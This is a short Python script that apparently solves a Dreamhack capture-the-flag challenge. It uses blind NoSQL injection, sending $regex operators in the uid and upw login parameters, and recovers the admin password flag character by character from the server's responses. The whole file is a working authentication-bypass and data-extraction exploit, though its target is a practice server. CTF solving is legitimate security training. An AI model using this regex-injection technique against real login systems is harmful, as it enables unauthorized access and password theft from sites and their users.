import requests
import string

url = 'http://host1.dreamhack.games:11885/login?uid[$regex]=adm..&upw[$regex]=D.{'
alphanumeric = string.ascii_letters + string.digits # 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
flag = ''

for i in range(32):
    for char in alphanumeric:
        res = requests.get(url + flag + char + '.*')
        if res.text == 'admin':
            flag += char
            print('DH{' + flag)
            break

print('DH{' + flag + '}')